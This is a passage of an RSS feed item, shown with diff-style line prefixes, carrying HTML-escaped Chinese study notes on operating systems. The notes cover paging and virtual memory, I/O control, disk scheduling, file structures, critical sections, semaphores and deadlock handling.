-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 单连续分区存储管理&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;单用户连续分区管理&lt;/strong&gt;：主存区划分为系统区和用户区，采用&lt;strong&gt;静态重定位&lt;/strong&gt;进行地址转换，一般适用于单用户单任务操作系统（DOS）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;固定分区管理&lt;/strong&gt;：一个程序占一个分区，有主存分配表，容易产生&lt;strong&gt;内零头&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;可变分区管理&lt;/strong&gt;：按进程内存需求动态分配内存空间，容易产生&lt;strong&gt;外零头&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;3. 页式存储管理 **&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概念：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;主存分&lt;strong&gt;页架&lt;/strong&gt;，程序分&lt;strong&gt;页&lt;/strong&gt;。&lt;/li&gt;
-&lt;li&gt;不同程序页可放在不同主存页架中，不需要连续&lt;/li&gt;
-&lt;li&gt;页和页架关系由&lt;strong&gt;页表&lt;/strong&gt;维护&lt;/li&gt;
-&lt;li&gt;用&lt;strong&gt;位示图&lt;/strong&gt;表示主存分配与去配，用&lt;strong&gt;进程页表&lt;/strong&gt;维护进程逻辑完整性&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;地址：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;逻辑地址&lt;/strong&gt;：页号 + 单元号&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;物理地址&lt;/strong&gt;：页架号 + 单元号&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;快表&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;利用&lt;strong&gt;Cache&lt;/strong&gt;存放部分页表&lt;/li&gt;
-&lt;li&gt;同Cache缓存内存数据一样，也是相联存储器技术，并且有淘汰策略，具体见&lt;a href=&quot;https://www.cnblogs.com/flashsun/p/10628433.html&quot; target=&quot;_blank&quot;&gt;《重学计算机 -- 计算机组成原理》&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;页式虚拟存储&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;页表&lt;/strong&gt;：标识位 + 主存块号 + 辅存地址&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;实现&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;查页表，若页在内存，则生成绝对地址&lt;/li&gt;
-&lt;li&gt;若不在内存，发起&lt;strong&gt;缺页中断&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;OS响应缺页中断，若内存有空闲页架，则从辅存中调入页。更新页表快表&lt;/li&gt;
-&lt;li&gt;若无空闲页架，先淘汰页，再调入&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;页面调度算法&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;同Cache和内存的调度策略，具体参考&lt;a href=&quot;https://www.cnblogs.com/flashsun/p/10628433.html&quot; target=&quot;_blank&quot;&gt;《重学计算机 -- 计算机组成原理》&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;4. 其他&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;段式存储管理&lt;/strong&gt;：基本不用，略&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;段页式存储管理&lt;/strong&gt;：基本不用，略&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;内存管理单元MMU：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：管理虚拟存储器的硬件控制线路，把虚拟地址映射为物理地址，并提供内存保护，必要时淘汰页面&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;实现&lt;/strong&gt;：用一种数据结构 &lt;strong&gt;反置页表IPT&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190412110558902-1176768606.png&quot; alt=&quot;&quot; width=&quot;501&quot; height=&quot;255&quot;/&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;blockquote readability=&quot;7.890124264225&quot;&gt;
-&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt;：许多年以前，当人们还在使用DOS或是更古老的操作系统的时候，计算机的内存还非常小，一般都是以K为单位进行计算，相应的，当时的程序规模也不大，所以内存容量虽然小，但还是可以容纳当时的程序。但随着图形界面的兴起还有用户需求的不断增大，应用程序的规模也随之膨胀起来，终于一个难题在程序员的面前，那就是应用程序太大以至于内存容纳不下该程序，通常解决的办法是把程序分割成许多称为覆盖块（overlay）的片段。覆盖块0首先运行，结束时他将调用另一个覆盖块。虽然覆盖块的交换是由OS完成的，但是必须先由程序员把程序先进行分割，这是一个费时费力的工作，而且相当枯燥。人们必须找到更好的办法从根本上解决这个问题。不久人们找到了一个办法，这就是&lt;a href=&quot;https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%AD%98%E5%82%A8%E5%99%A8&quot; target=&quot;_blank&quot;&gt;虚拟存储器&lt;/a&gt;(virtual memory).虚拟存储器的基本思想是程序，数据，&lt;a href=&quot;https://baike.baidu.com/item/%E5%A0%86%E6%A0%88&quot; target=&quot;_blank&quot;&gt;堆栈&lt;/a&gt;的总的大小可以超过物理存储器的大小，操作系统把当前使用的部分保留在内存中，而把其他未被使用的部分保存在磁盘上。比如对一个16MB的程序和一个内存只有4MB的机器，操作系统通过选择，可以决定各个时刻将哪4M的内容保留在内存中，并在需要时在内存和磁盘间交换程序片段，这样就可以把这个16M的程序运行在一个只具有4M内存机器上了。而这个16M的程序在运行前不必由程序员进行分割。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2&gt;四、设备管理&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. IO的控制方式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;演进过程&lt;/strong&gt;：轮询 --&amp;gt; 中断 --&amp;gt; DMA --&amp;gt; IO通道&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;经典布局&lt;/strong&gt;：南北桥
-&lt;ul&gt;&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190415100940892-635620133.png&quot; alt=&quot;&quot; width=&quot;504&quot; height=&quot;190&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;PS&lt;/strong&gt;：详见&lt;a href=&quot;https://www.cnblogs.com/flashsun/p/10628433.html&quot; target=&quot;_blank&quot;&gt;《计算机组成原理》&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. IO的实现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;软件实现层次&lt;/strong&gt;：硬件 --&amp;gt; 中断处理程序 --&amp;gt; 设备驱动程序 --&amp;gt; 独立于设备的IO软件 --&amp;gt; 用户空间的IO软件&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;IO缓冲：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;解决问题：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;设备与CPU速度不匹配&lt;/li&gt;
-&lt;li&gt;逻辑记录大小和物理记录大小不一致&lt;/li&gt;
-&lt;li&gt;减少IO操作对CPU的中断次数&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;实现&lt;/strong&gt;：缓冲区
-&lt;ul&gt;&lt;li&gt;内存中开辟一个专门&lt;strong&gt;临时&lt;/strong&gt;存放IO数据的区域&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：单缓冲、双缓冲、多缓冲&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;3. 磁盘&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190415102328801-1391299784.png&quot; alt=&quot;&quot; width=&quot;234&quot; height=&quot;268&quot;/&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;调度策略&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;移臂调度&lt;/strong&gt;：以双向调度中的电梯调度算法为经典&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;旋转调度&lt;/strong&gt;：写数据时采用&lt;strong&gt;交叉因子&lt;/strong&gt;写入方式，可以提高旋转读数据的命中率&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h2&gt;五、文件系统&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 文件系统&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;文件系统概述&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;文件的组织：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;逻辑结构&lt;/strong&gt;：流式、记录式&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;物理结构&lt;/strong&gt;：顺序、连接、直接、索引&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的存取&lt;/strong&gt;：顺序、直接、索引&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的控制&lt;/strong&gt;：逻辑控制、物理控制&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的使用&lt;/strong&gt;：打开、关闭、读、写、控制&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的存储&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;块&lt;/strong&gt;：存储介质上连续存储的区域，是主存与辅存信息交换的单位&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;顺序存取设备&lt;/strong&gt;：光盘、磁带&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;直接存取设备&lt;/strong&gt;：磁盘&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 文件&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;文件的逻辑结构&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;流式文件&lt;/strong&gt;：只是由一段字节序列构成的&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;记录式文件&lt;/strong&gt;：有含义有结构的信息，比如员工工资记录&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的物理机构&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;顺序文件&lt;/strong&gt;：块块之间相连，批处理文件和系统文件一般都这么存。---&amp;gt; 数组&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;连接文件&lt;/strong&gt;：有连接字指向下一个块地址。---&amp;gt; 链表&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;直接文件&lt;/strong&gt;：又叫散列文件。对内容进行散列存储到相应物理位置。 ---&amp;gt; 散列表&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;索引文件&lt;/strong&gt;：为文件建立一个索引表，可多级。 ---&amp;gt; 增加了散列表的链表&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;文件的目录&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概念&lt;/strong&gt;：实现文件按名存取的关键数据结构&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：一级目录、二级目录、树型目录&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h2&gt;六、并发程序设计&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 并发程序的基本概念&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;程序顺序性&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;内部顺序性&lt;/strong&gt;：CPU严格按照顺序执行指令&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;外部顺序性&lt;/strong&gt;：程序员设计程序时往往用顺序设计的思想&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;顺序程序特性&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;程序执行的顺序性&lt;/li&gt;
-&lt;li&gt;计算环境的封闭性： 程序执行时犹如独占资源&lt;/li&gt;
-&lt;li&gt;计算结果的确定性&lt;/li&gt;
-&lt;li&gt;计算过程的可再现性&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;并发进程&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;无关的并发进程&lt;/strong&gt;：一组并发进程，在不同变量集上运行&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;交往的并发进程&lt;/strong&gt;：一组并发进程，共享某些变量，相互影响&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;并发进程制约关系&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;进程互斥&lt;/strong&gt;：争夺某一个资源&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程同步&lt;/strong&gt;：共同完成某一个任务，协调先后顺序&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;发生问题：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;与时间有关的错误：结果错误、永远等待&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;临界区：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;临界资源&lt;/strong&gt;：一次只能被一个进程使用的资源（互斥共享变量）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;临界区&lt;/strong&gt;：是个&lt;strong&gt;程序段&lt;/strong&gt;，是并发进程中与&lt;strong&gt;互斥共享变量&lt;/strong&gt;相关的程序段&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;相关的临界区&lt;/strong&gt;：两个进程的临界区有相同的临界资源（必须互斥进入）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;问题&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;多个并发进程访问临界资源存在制约关系&lt;/li&gt;
-&lt;li&gt;如果两个进程同时处在相关的临界区，会发生与时间有关的错误&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;临界区管理的要求&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;一次至多允许一个进程停留在相关临界区&lt;/li&gt;
-&lt;li&gt;一个进程不能&lt;strong&gt;无限制停留&lt;/strong&gt;在临界区内&lt;/li&gt;
-&lt;li&gt;一个进程不能&lt;strong&gt;无限制等待&lt;/strong&gt;进入临界区内&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;临界区嵌套使用&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190415172104272-2058405406.png&quot; alt=&quot;&quot; width=&quot;427&quot; height=&quot;242&quot;/&gt; &lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 并发程序控制和问题&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;临界区管理实现：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;思路&lt;/strong&gt;：&lt;strong&gt;判断锁&lt;/strong&gt;和&lt;strong&gt;获取锁&lt;/strong&gt;要作为原子操作，不然会死锁或时间错误&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;实现&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;原子指令：&lt;/strong&gt;测试并建立锁指令、对换指令（忙式等待，效率不高）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;中断控制&lt;/strong&gt;：进出临界区时开关中断，这样临界区执行时就不会被中断，自然实现了原子性
-&lt;ul&gt;&lt;li&gt;这个时操作系统的原语，是操作系统解决这个问题的办法&lt;/li&gt;
-&lt;li&gt;不建议用户程序使用，因为无法保证程序员设计出短小精悍的原语&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;PV操作&lt;/strong&gt;：用&lt;strong&gt;信号量&lt;/strong&gt;，“申请-等待队列-中断恢复”&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;生产者消费者问题&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190417192521021-535768357.png&quot; alt=&quot;&quot; width=&quot;480&quot; height=&quot;326&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程间通信&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;信号量&lt;/strong&gt;：低级通信方式&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;信件&lt;/strong&gt;：进程通信机制（直接通信、间接通信）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;基于流&lt;/strong&gt;：多个进程共同使用一个缓冲区&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;RPC&lt;/strong&gt;：远程过程调用&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;死锁&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概念&lt;/strong&gt;：两个进程分别等待对方占有的资源&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;死锁的产生&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;互斥&lt;/strong&gt;：进程互斥地使用资源&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;占有和等待&lt;/strong&gt;：一个进程得不到资源，就等待且不释放已有资源&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;不剥夺&lt;/strong&gt;：进程不能从另一个进程抢走资源&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;循环等待&lt;/strong&gt;：每个进程都等待它前一个进程所持有的资源&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;死锁的防止&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;破坏上述四个条件之一即可&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;eg. 层次分配&lt;/strong&gt;：资源分成多个层次，一个进程获得某个资源后只能获得比他层次更高的资源　　&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;死锁的避免&lt;/strong&gt;：银行家算法&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;死锁的检测&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/flashsun/p/10628433.html&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190417205010323-1983641529.png&quot; alt=&quot;&quot; width=&quot;422&quot; height=&quot;248&quot;/&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;算法&lt;/strong&gt;：warshall闭包&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-<pubDate>Wed, 17 Apr 2019 13:19:00 +0000</pubDate>
-<dc:creator>闪客sun</dc:creator>
-<og:description>一、操作系统概述 1. 计算机软硬件系统 冯诺伊曼结构 以运算单元为核心，控制流由指令流产生 程序和数据存储在主存中 主存是按地址访问，线性编址 指令由操作码和地址码组成 数据以二进制编码 其他：参考</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/flashsun/p/10669879.html</dc:identifier>
 </item>
 </channel>
 </rss>
